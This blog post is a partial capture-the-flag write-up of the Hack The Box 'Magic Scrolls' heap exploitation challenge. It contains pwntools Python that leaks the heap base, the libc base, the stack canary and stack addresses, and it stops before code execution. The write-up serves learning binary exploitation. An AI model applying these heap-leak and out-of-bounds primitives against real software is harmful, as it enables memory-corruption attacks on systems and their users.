---
title: "HTB: Magic Scrolls Pwn Writeup"
date: 2026-04-20
categories: 
  - "reverse-engineering"
  - "pwn"
tags: 
  - "pwn"
  - "ctf"
  - "hackthebox"
  - "htb"
  - "binary exploitation"
  - "reverse-engineering"
---

DISCLAIMER: Before you start diving into this post, I want to warn you that I haven't yet solved the challenge. I believe I am very close, but it is not yet solved if this disclaimer is still up! Don't tell me I didn't warn you :)

I think I tried to bite something I can't chew... For this week's pwn challenge, I decided to try something a bit harder, and picked a hard level challenge from Hack The Box. I am not going to say it was a mistake, but oh boy it definitely was hard, way harder than I can even imagine.

This week I am looking at Magic Scrolls pwn challenge from HTB. It is classified as hard, and it definitely deserves that classification. There were so many new techniques and approaches that I didn't even know it was possible. This challenge is heavily focused on the heap. If you aren't much well versed in heap exploitation like me, have a look at these links, they go into much detail on how heap works, how heap attacks work for different versions of libc etc. 

1. <https://mintlify.wiki/shellphish/how2heap/fundamentals/heap-basics>
2. <https://github.com/shellphish/how2heap>
3. <https://blog.quarkslab.com/heap-exploitation-glibc-internals-and-nifty-tricks.html>
4. <https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/>

## Analysis

Looking at the decompiled binary in ghidra, we can quickly see that it is similar to other heap based challenges where we are given a menu with different options to allocate/read/write/free memory chunks. I briefly went over the decompiled functions and identified a few issues I could find.


1. If charm isn't Alohomara, power is equal to 4. Otherwise power is 0

2. update_magic_numbers:
   1. Index should be 1 2 3 or 4
   2. magic_numbers is an array of 4 long integers(64bit) given index is used to update the value of
      magic number value like magic_numbers[ind-1]. So we can store 4 long integers in memory.
   3. Once a magic number is set at the given index, it does some stuff based on power if it isn't zero
   4. There is a potential bug here  magic_numbers[power + 1]  this is accessing outside the magic numbers array I think
      This also applies to places where it is using power as index
   5. For some reason, this function doesn't have a canary check??
   6. memset within if checks only clears the first byte of corresponding memory!

3. create_spell:
   1. Up to 16 spells can be created
   2. Stack is used to store certain sizes and lengths etc.
   3. spells is an array of pointers to allocated memories
   4. Each spell's length is up to 512 and lengths are stored in spell_len array.
   5. User's input is stored in memory pointed by the pointer stored in spells array.

4. remove_spell:
   1. User inputs index of spell to remove. ind should be from 0 to spell_count
   2. Given index's memory is freed. pointer set to null, spell_len set to 0. 
   3. Not sure why super_spell_set and super_spell_len is for yet.

5. read_spell:
   1. If super_spell_set is negative, it doesn't do anything. Just prints favorite spell not chosen.
   2. Prints the spell in scroll ASCII art.
   3. Within the middle of the scroll, prints super_spell character by character by casting to int?
   4. Also no stack canary check here

6. set_favorite_spell
   1. If super_spell_set is -1, favorite spell is not set.
   2. If not -1, favorite is already set. It reads from spells array and stores in super_spell. And then
      pointer to super_spell, is stored in a local variable in stack for no reason.
   3. If -1, it receives and index from user. Index should be from 0 to spell_count
   4. spell_len of the selected spell should be equal or less than 256 characters
   5. If conditions are met, super_spell_set and super_spell_len is set accordingly.
   6. Also for some reason, pointer to super_spell is stored in a local variable here. 
   7. Interestingly there is no stack canary check in this function.

I should also note that, it has all the relevant security flags enabled, PIE , stack isn't executable, full relro etc. So it already looks quite challenging.

## Bugs

Since this is a hard challenge, it is not filled with easy to use or notice bugs it seems. We need to make use of tools given to us to reach to the target. So far I have identified a few bugs:

1. magic_numbers[power] can write into spells[0] and spells[1] when power is 4

2. super_spell = spells[super_spell_set]  this line is executed even when super spell is set. If super_spell_set is 0, that would read spells[0], and update the stored data in super_spell anytime we call set_favorite_spell function. Since we can control spells[0] with the first bug, and then call read_spell to print characters up to super_spell_len, we can arbitrary memory leak using these combination of bugs.

3. These bugs are great but there is a problem, adresses are randomized with PIE and ASLR. We need a leak! For this we will need to use memset in the create_spell function. When that branch gets executed, it clears the first bytes spells[0] and spells[1]

Since all security flags are enabled, we need a few things before we can do the actual solution. We need to leak libc base, canary value, heap base etc.

## Phase 1: Leak Heap Base

This is a heap based challenge, so leaking heap base should definitely help us in same way or another. For this one, we will be using the memset I mentioned above. If you look at decompiled remove_spell, you can see that it clears the pointer and spell length. So removing favorite spell is an issue since we can't read it. For this reason, we allocate two chunks and use the second chunk as the favorite spell:

```python
total_spells = 0

def create_spell(p, spell_text):
    global total_spells

    p.sendlineafter(b'> ', b'2') # Select create spell function
    p.sendafter(b'Spell: ', spell_text)

    total_spells += 1
    print(f'Total spells created: {total_spells}')

def remove_spell(io, idx: int):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Index: ", str(idx).encode())


def set_favorite(p, ind = b'-1'):
    p.sendlineafter(b'> ', b'5')
    
    if ind != b'-1':
        p.sendlineafter(b'Index for Favorite spell: ', ind)

def read_spell(io):
    io.sendlineafter(b'> ', b'4')

    # Receive header - 10 seconds timeout to allow for some time to receive
    io.recv(0x3e8, 10)

    return io.recvuntil(b'+$$+#*#$*++')

def leak_heap(io):
    leaked = read_spell(io)
    return extract_heap_leak(leaked)


def parse_read_spell(data: bytes) -> bytes:
    """
    Strip the '                     :-:' prefix and ':-:\\n' suffix from each
    line of read_spell output, reassemble the raw data bytes.
    """
    PREFIX = b"                     :-:"
    SUFFIX = b":-:"

    raw = b""
    for line in data.split(b"\n"):
        if not line:
            continue
        if line.startswith(PREFIX):
            # strip prefix and suffix, whatever remains is data bytes
            content = line[len(PREFIX):]
            if content.endswith(SUFFIX):
                content = content[:-len(SUFFIX)]
            raw += content

    print(raw)

    return raw


def extract_heap_leak(spell_output: bytes) -> int:
    """
    Extract the heap base from read_spell output.

    super_spell was forged to heap+0x200.
    The freed H0 chunk sits at heap+0x2a0, which is at offset 0xa0
    within the read window. Its first 8 bytes = safe-linked tcache fd
    = H0 >> 12 = (heap_base + 0x2a0) >> 12.
    """
    LEAK_OFFSET = 0xa0          # offset of H0's data within read window
    
    raw = parse_read_spell(spell_output)

    # read 8 bytes at the leak offset (little-endian)
    mangled_fd = int.from_bytes(raw[LEAK_OFFSET : LEAK_OFFSET + 8], "little")

    # safe-linking: stored = ptr ^ (ptr >> 12), and next=NULL so stored = 0 ^ (H0>>12)
    # H0 = heap_base + 0x2a0, and 0x2a0 < 0x1000 so:
    # mangled_fd = (heap_base + 0x2a0) >> 12 = heap_base >> 12  (low 12 bits lost)
    # recover: heap_base = mangled_fd << 12
    heap_base = mangled_fd << 12

    print(hex(heap_base))

    return heap_base    

# Send magic charm != Alohomora to have power = 4
io.sendafter(b'> ', b'POWER')

create_spell(io, b'A')
create_spell(io, b'A' * 256)

set_favorite(io, b'1')

# Remove spell 0 now. 
remove_spell(io, 0)

# Create magic numbers to clear first byte of spells[0] and spells[1]
# which also sets them to same heap pointer if spells[0] is a small allocation.
io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'Index for magic number: ', b'1')
io.sendlineafter(b'Magic number: ', b'0')

# Refresh super spell pointer
set_favorite(io)

heap_base = leak_heap(io)
```

Since we don't know what address to read from, we need something given to us from the binary itself. Freeing a heap chunk is the best candidate for such purposes. When a chunk is freed, heap manager writes some mangled heap pointers there. We make use of that written pointer as our read target. Once we go through the dump of the memory, we can extract the mangled pointer and easily recover the original value since we can already guess where this chunk is since it is the first chunk allocated on heap.

## Phase 2: Libc Leak using Unsorted bin

This was a completely new technique to me. I had to go through how heap is managed, how allocation and free works in which order etc. I would highly suggest going through the first link I listed at the beginning of this post. It gives a very nice and detailed summary of these operations. It was actually claude who pointed me in this direction, and it was right. 

This approach relies on tcache bins and how it stores up to 7 deallocated chunk pointers. After 7 free, 8th depending on size can go into small bins or unsorted bin. We use big enough size to make sure it goes to unsorted bins. Unsorted bins' fd and bk pointers use an address from libc! That is the leak we use to find libc base.

```python
def phase2_libc_leak(io, heap_base: int) -> int:
    """
    Requires: heap_base already known (from phase 1).
    Returns:  libc_base
    """

    # ── allocate 8 equal-size spells (indices 2..9) ───────────────────────────
    # spell[2..8]: will fill tcache[0x110] (7 entries max)
    # spell[9]:    8th free → unsorted bin, gets libc fd/bk pointers
    for i in range(8):   # spells 2..9
        create_spell(io, b"A" * 0x100)

    # Allocate one more buffer to prevent freed spells going into consolidation
    create_spell(io, b'A' * 0x30)

    # ── free spells 2..8: fill tcache[0x110] ──────────────────────────────────
    for i in range(2, 9):
        remove_spell(io, i)       # 7 frees → tcache[0x110] now full (capacity = 7)

    # ── free spell[9]: tcache full → goes to unsorted bin ─────────────────────
    remove_spell(io, 9)           # H9's fd & bk = main_arena+0x60 (libc pointer!)

    # ── forge spells[1] → H9 so set_favorite refreshes super_spell there ──────
    # ── redirect super_spell to H9 via set_favorite else-branch ───────────────
    # ── read H9: first 8 bytes are unsorted bin fd = main_arena+0x60 ──────────
    print(heap_base)
    print(H[9])

    H9 = heap_base + H[9]
    libc_ptr  = read_qword(io, H9)     # fd of unsorted bin chunk
    libc_base = libc_ptr - 0x1D3CE0

    log.success(f"libc leak    : {hex(libc_ptr)}")
    log.success(f"libc_base    : {hex(libc_base)}")
    return libc_base
    
```

While working on this phase, I got stuck for a while. At this point I learned about `consolidation` depending on where the freed chunk is, they can get combined with other chunks! This could cause a problem since we want the chunk pointer to go to unsorted bins. To prevent that, I have allocated one more spell after the 8th buffer to make sure it doesn't get combined with the final big heap chunk.

![Unsorted bins](/assets/img/magic_unsorted.png)

Once we successfully delete the 8th chunk of same size, this time instead of going to tcache it gets sent to unsorted bins with the fd and bk pointers as shown above. **pwndbg's tools are very useful for debugging this: tcachebins, heap, chunks** I found the offset 0x1D3CE0 by debugging multiple runs and always getting same offset to libc. 


## Phase 3: Stack leak

Since there is canary enabled, I think it would be useful to find both canary value, and a leak to stack address. I used a similar approach to <https://yusuftas.net/posts/tkbctf-stack-bof-writeup/> this challenge to find canary value. Stack canary is stored in FS+0x28 in memory, and this one is at a fixed offset to libc base. By debugging a few times and finding the difference between libc base and FS+0x28, I was able to find canary value:

```python
def get_canary(io, canary_addr: int) -> int:
    # Set spells[1] - favorite spell - to canary address
    # Refresh favorite spell to read the canary and then read it
    canary = read_qword(io, canary_addr)
    print(hex(canary))
    return canary

def read_qword(io, addr):
    # Set spells[1] to given address and then read it
    forge_spells1(io, addr)
    set_favorite(io)
    raw  = read_spell(io)
    data = parse_read_spell(raw)
    return u64(data[0:8])

def update(io, menu_idx: int, value: int):
    """menu_idx: 1-4 (maps to magic_numbers[0..3])"""
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Index for magic number: ", str(menu_idx).encode())
    io.sendlineafter(b"Magic number: ", str(value).encode())

def forge_spells1(io, target: int):
    """
    OOB-write spells[1] = target  (via magic_numbers[1] & magic_numbers[3]).
    Sequence: set [3]=-1 first (kills spells[1] momentarily),
              then set [1]=target (restores spells[1]=target).
    """
    update(io, 4, -1)       # magic_numbers[3] = 0xffff...  →  spells[1] = 0 & -1 = 0
    update(io, 2, target)   # magic_numbers[1] = target     →  spells[1] = target & -1 = target


# Stack canary is at a fixed offset to libc base. Find this
# by debugging and looklng at where FS:28 is from. We can use
# arbitrary leak to use this address and read canary value
canary_address = libc_base - 0x2898
canary_value   = get_canary(io, canary_address)

```

After finding canary value, we can search it in libc environ table to find stack address:

```python
def phase3_stack_leak(io, libc_base, known_canary):

    # step 1: get envp[0] as scan starting point
    envp0 = read_qword(io, libc_base + LIBC_ENVIRON)
    log.info(f"envp[0] = {hex(envp0)}")

    # step 2: scan downward for exact canary value
    scan_addr        = envp0
    main_canary_addr = None

    for _ in range(0x200):
        scan_addr -= 8
        val = read_qword(io, scan_addr)

        if val == known_canary:
            main_canary_addr = scan_addr
            log.success(f"main canary  @ {hex(main_canary_addr)}")
            break

    assert main_canary_addr is not None, "Canary not found"

    # We actually hit libc's stack canary in the stack, by debugging I found
    # the difference between main's canary address and the canary address we found
    main_canary_addr = main_canary_addr - 0xA0

    # step 3: compute create_spell's canary addr from fixed static offsets
    create_canary_addr = main_canary_addr - 0x80
    create_return_addr = create_canary_addr + 0x20 
    log.success(f"create_spell canary @ {hex(create_canary_addr)}")
    log.success(f"create_spell return @ {hex(create_return_addr)}")

    return create_canary_addr, create_return_addr


[create_canary_addr, create_return_addr] = phase3_stack_leak(io, libc_base, canary_value)

```

If you look at the code you can see a few hardcoded offsets. I found them by debugging as well, they should always be same value for this particular binary. One of my example notes:

```
main
   0x7fff6fe83198  canary
   0x7fff6fe831a8  return
   
create_spell
	0x7fff6fe83118 canary 
	0x7fff6fe83138 return
	
Found libc canary address:  0x7fff6fe83238

offset to actual main canary address = 0x7fff6fe83238 - 0x7fff6fe83198 = 0xA0

offset to create canary address from main = 0x7fff6fe83118 - 0x7fff6fe83198 = -0x80
```

## Phase 4: Code execution

So far we have leaked almost everything. We can read stuff from anywhere, but we still haven't found a way to execute shell. Well, I am stuck here actually :( I can't yet figure out how to go from here to the final solution. Claude have been suggesting me stuff and it is also going around circles and getting stuck. I will come back to here once I can get the final phase working, but until then keep learning!

